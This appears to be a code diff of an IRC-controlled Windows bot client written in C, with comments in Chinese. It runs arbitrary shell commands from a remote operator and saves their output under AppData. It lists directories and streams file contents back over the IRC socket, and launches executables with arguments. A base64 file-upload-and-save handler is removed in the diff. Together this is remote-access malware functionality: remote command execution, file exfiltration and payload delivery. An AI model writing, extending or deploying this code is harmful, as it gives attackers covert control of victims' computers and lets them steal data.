@@ -1,26 +1,66 @@
 #include"header.h"
 
 
+DWORD WINAPI ExecuteCommandThread(LPVOID lpParam) {
+    struct CommandData {
+        const char* cmd;
+        const char* path;
+    };
 
+    struct CommandData* data = (struct CommandData*)lpParam;
 
-char* ExecuteCommand(const char* cmd) {
-    FILE* pipe = _popen(cmd, "r");
-    if (!pipe) return _strdup("[!] fail to execute");
-
-    char buffer[4096];
-    size_t total = 0;
-    char* output = (char*)malloc(1);
-
-    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
-        size_t len = strlen(buffer);
-        output = (char*)realloc(output, total + len + 1);
-        memcpy(output + total, buffer, len);
-        total += len;
-        output[total] = '\0';
+    FILE* pipe = _popen(data->cmd, "r");
+    if (!pipe) {
+        bot_log("[!] Failed to execute command: %s\n", data->cmd);
+        return 1;
     }
 
+    FILE* outputFile = fopen(data->path, "w");
+    if (!outputFile) {
+        bot_log("[!] Failed to open file: %s\n", data->path);
+        _pclose(pipe);
+        return 1;
+    }
+
+    char buffer[4096];
+    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
+        fputs(buffer, outputFile);
+    }
+
+    fclose(outputFile);
     _pclose(pipe);
-    return output;
+
+    return 0;
+}
+
+char* ExecuteCommand(const char* cmd) {
+    struct CommandData {
+        const char* cmd;
+        const char* path;
+    };
+    char fpath[MAX_PATH];
+    strcpy(fpath, appdata_path);
+    strcat_s(fpath, sizeof(fpath), "\\BotLogs\\cmd_output.txt");
+    struct CommandData data = { cmd, fpath };
+
+    HANDLE hThread = CreateThread(
+        NULL,                   // default security attributes
+        0,                      // use default stack size  
+        ExecuteCommandThread,   // thread function name
+        &data,                  // argument to thread function 
+        0,                      // use default creation flags 
+        NULL);                  // returns the thread identifier 
+
+    if (hThread == NULL) {
+        bot_log("[!] Failed to create ExecuteCommandThread\n");
+        return NULL;
+    }
+
+    // Close the thread handle to avoid resource leaks
+    CloseHandle(hThread);
+
+    return _strdup(fpath);
+
 }
 
 
@@ -43,28 +83,17 @@ char* list_directory(const char* path) {
     WIN32_FIND_DATA findFileData;
     HANDLE hFind;
 
-    // 支持中文路径（转换为宽字符）
-    int wPathLen = MultiByteToWideChar(CP_UTF8, 0, path, -1, NULL, 0);
-    wchar_t* wPath = (wchar_t*)malloc((wPathLen + 3) * sizeof(wchar_t));
-    MultiByteToWideChar(CP_UTF8, 0, path, -1, wPath, wPathLen);
+    wchar_t wPath[MAX_PATH];
+    AnsiToUnicode(path, wPath, MAX_PATH);
     wcscat(wPath, L"\\*");
-
-    // 初始化输出缓冲区
-    size_t outputSize = 4096;
-    char* output = (char*)malloc(outputSize);
-    if (!output) {
-        free(wPath);
-        return _strdup("[!] Memory allocation failed");
-    }
-    output[0] = '\0';
+   
+    
 
     // 开始查找文件
     hFind = FindFirstFileW(wPath, &findFileData);
-    free(wPath);
 
     if (hFind == INVALID_HANDLE_VALUE) {
-        snprintf(output, outputSize, "[!] No files found in %s", path);
-        return output;
+        return _strdup("FindFirstFileW return INVALID_HANDLE_VALUE");
     }
 
     do {
@@ -74,40 +103,61 @@ char* list_directory(const char* path) {
             continue;
         }
 
-        // 转换文件名回 ANSI/UTF-8
+        // 转换文件名回 ANSI
         char fileName[512];
-        WideCharToMultiByte(CP_UTF8, 0, findFileData.cFileName, -1, fileName, sizeof(fileName), NULL, NULL);
+        UnicodeToAnsi(findFileData.cFileName, fileName, sizeof(fileName));
 
         // 判断是文件还是目录
-        const char* type = (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? "<DIR>" : "     ";
+        const char* type = (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? "<DIR>" : "<FILE>";
 
         // 格式化输出
         char line[1024];
-        snprintf(line, sizeof(line), "%-8s %-12s\n", fileName, type);
-
-        // 检查是否需要扩容
-        if (strlen(output) + strlen(line) >= outputSize) {
-            outputSize *= 2;
-            output = (char*)realloc(output, outputSize);
-        }
-
-        strcat(output, line);
+        snprintf(line, sizeof(line), "%s%s    \n", fileName, type);
+        appendToBuffer(&msgBuffer, ircsock, line);
 
     } while (FindNextFile(hFind, &findFileData));
+    flushBuffer(&msgBuffer, ircsock);
 
     FindClose(hFind);
-    return output;
+    return _strdup("ls complete.");
 }
 
 // 执行指定路径的 exe 文件
-int run_executable(const char* path, int mode) {
-    HINSTANCE result = ShellExecuteA(NULL, "open", path, NULL, NULL, mode);
+int run_executable(const char* path, const char* args, int mode) {
+    size_t path_len = strlen(path);
+    size_t args_len = strlen(args);
+
+    // 分配内存
+    wchar_t* wpath = (wchar_t*)malloc((path_len + 1) * sizeof(wchar_t));
+    if (!wpath) {
+        bot_log("[!] Memory allocation failed for wpath\n");
+        return -1;
+    }
+
+    wchar_t* wargs = (wchar_t*)malloc((args_len + 1) * sizeof(wchar_t));
+    if (!wargs) {
+        bot_log("[!] Memory allocation failed for wargs\n");
+        free(wpath);
+        return -1;
+    }
+
+    // 转换路径和参数
+    AnsiToUnicode(path, wpath, (path_len + 1) * sizeof(wchar_t));
+    AnsiToUnicode(args, wargs, (args_len + 1) * sizeof(wchar_t));
+
+    // 执行程序
+    HINSTANCE result = ShellExecuteW(NULL, L"open", wpath, wargs, NULL, mode);
+
+    // 清理资源
+    free(wpath);
+    free(wargs);
+
     return (intptr_t)result > 32 ? 0 : -1;
 }
 
 // 获取当前工作目录
 char* pwd_command() {
-    char buffer[DEFAULT_BUFLEN];
+    char buffer[MAX_PATH];
     if (_getcwd(buffer, sizeof(buffer)) == NULL) {
         return _strdup("[!] Failed to get current working directory");
     }
@@ -129,184 +179,16 @@ char* cd_command(const char* path) {
 char* cat_file(const char* path) {
     FILE* fp = fopen(path, "r");
     if (!fp) {
-        char* error = (char*)malloc(256);
-        snprintf(error, 256, "[!] Failed to open file: %s", path);
-        return error;
+        return _strdup("Fail to open file.");
     }
-
-    size_t totalSize = 0;
-    size_t bufferSize = 4096;
-    char* buffer = (char*)malloc(bufferSize);
-    buffer[0] = '\0';
 
     char line[1024];
     while (fgets(line, sizeof(line), fp)) {
-        // 替换非法字符
-        for (int i = 0; line[i]; i++) {
-            if (line[i] == '\r' || line[i] == '\n') line[i] = ' ';
-        }
-
-        size_t len = strlen(buffer) + strlen(line) + 2;
-        if (len > bufferSize) {
-            bufferSize *= 2;
-            buffer = (char*)realloc(buffer, bufferSize);
-        }
-        strcat(buffer, line);
-        strcat(buffer, "\n");
+        appendToBuffer(&msgBuffer, ircsock, line);
     }
+    flushBuffer(&msgBuffer, ircsock);
 
     fclose(fp);
-    return buffer;
+    return _strdup("FILE END");
 }
 
-BYTE* base64_decode(const char* input, DWORD in_len, DWORD* out_len) {
-    DWORD decoded_len = 0;
-    if (!CryptStringToBinaryA(input, in_len, CRYPT_STRING_BASE64, NULL, &decoded_len, NULL, NULL)) {
-        printf("[!] Failed to calculate decoded length\n");
-        return NULL;
-    }
-
-    BYTE* output = (BYTE*)malloc(decoded_len + 1);
-    if (!output) {
-        printf("[!] Memory allocation failed\n");
-        return NULL;
-    }
-
-    if (CryptStringToBinaryA(input, in_len, CRYPT_STRING_BASE64, output, &decoded_len, NULL, NULL)) {
-        *out_len = decoded_len;
-        output[decoded_len] = '\0';  // 可选：空终止符
-        return output;
-    }
-
-    free(output);
-    return NULL;
-}
-
-typedef struct {
-    char filename[MAX_PATH];    // 文件名
-    long size;                 // 文件大小
-    FILE* fp;                   // 文件指针
-    char* b64_content;        // Base64 缓存
-    long b64_len;              // 当前 Base64 长度
-    long b64_capacity;         // Base64 缓存容量
-    char expected_hash[65];   // 存储期望的 SHA256 值
-} ReceivedFile;
-
-extern ReceivedFile current_file;
-
-ReceivedFile current_file = { 0 };
-
-int handle_file_upload(ParsedCommand cmd) {
-    for (int i = 0; i < cmd.num_params; ++i) {
-        char* line = cmd.params[i];
-
-        if (strcmp(line, "UPLOADSTART") == 0) {
-            // 重置上传状态
-            if (current_file.b64_content) {
-                free(current_file.b64_content);
-            }
-            memset(&current_file, 0, sizeof(ReceivedFile));
-            printf("[+] Upload started\n");
-        }
-
-        else if (strncmp(line, "FILENAME:", 9) == 0) {
-            strncpy(current_file.filename, line + 9, MAX_PATH - 1);
-            current_file.filename[MAX_PATH - 1] = '\0';
-            printf("[+] Receiving file: %s\n", current_file.filename);
-        }
-
-        else if (strncmp(line, "SIZE:", 5) == 0) {
-            current_file.size = atol(line + 5);
-            current_file.b64_capacity = current_file.size * 2;
-
-            if (current_file.b64_content) {
-                free(current_file.b64_content);
-            }
-            current_file.b64_content = (char*)malloc(current_file.b64_capacity + 1);
-            if (!current_file.b64_content) {
-                printf("[!] Memory allocation failed\n");
-                return -1;
-            }
-            current_file.b64_len = 0;
-        }
-
-        else if (strncmp(line, "DATA:", 5) == 0) {
-            const char* data = line + 5;
-            int data_len = strlen(data);
-
-            if (current_file.b64_len + data_len + 1 >= current_file.b64_capacity) {
-                current_file.b64_capacity += 1024;
-                char* new_buf = (char*)realloc(current_file.b64_content, current_file.b64_capacity + 1);
-                if (!new_buf) {
-                    printf("[!] Memory reallocation failed\n");
-                    return -1;
-                }
-                current_file.b64_content = new_buf;
-            }
-
-            memcpy(current_file.b64_content + current_file.b64_len, data, data_len);
-            current_file.b64_len += data_len;
-        }
-
-        else if (strncmp(line, "HASH:", 5) == 0) {
-            strncpy(current_file.expected_hash, line + 5, 64);
-            current_file.expected_hash[64] = '\0';
-            printf("[+] Expected SHA256: %s\n", current_file.expected_hash);
-        }
-
-        else if (strcmp(line, "UPLOADEND") == 0) {
-            if (!current_file.b64_content || current_file.b64_len == 0) {
-                printf("[!] No data received\n");
-                return -1;
-            }
-
-            // 解码 Base64
-            DWORD decoded_len = 0;
-            BYTE* decoded = base64_decode(current_file.b64_content, current_file.b64_len, &decoded_len);
-            if (decoded && decoded_len > 0) {
-                // 计算 SHA256
-                char actual_hash[65];
-                if (compute_sha256(decoded, decoded_len, actual_hash) != 0) {
-                    printf("[-] SHA256 calculation failed\n");
-                    free(decoded);
-                    return -1;
-                }
-
-                // 校验
-                if (strlen(current_file.expected_hash) == 64 &&
-                    memcmp(current_file.expected_hash, actual_hash, 64) == 0) {
-                    printf("[+] SHA256 verified: %s\n", actual_hash);
-
-                    // 保存文件
-                    current_file.fp = fopen(current_file.filename, "wb");
-                    if (current_file.fp) {
-                        fwrite(decoded, 1, decoded_len, current_file.fp);
-                        fclose(current_file.fp);
-                        printf("[+] File saved: %s (%ld bytes)\n", current_file.filename, decoded_len);
-                    }
-                    else {
-                        printf("[!] Failed to open file: %s\n", current_file.filename);
-                    }
-                }
-                else {
-                    printf("[-] SHA256 verification failed!\n");
-                    printf("[-] Expected: %s\n", current_file.expected_hash);
-                    printf("[-] Actual:   %s\n", actual_hash);
-                }
-            }
-            else {
-                printf("[!] Base64 decode failed\n");
-            }
-
-            // 清理资源
-            free(current_file.b64_content);
-            free(decoded);
-            current_file.b64_content = NULL;
-            current_file.b64_len = 0;
-            current_file.size = 0;
-            current_file.fp = NULL;
-        }
-    }
-
-    return 0;
-}
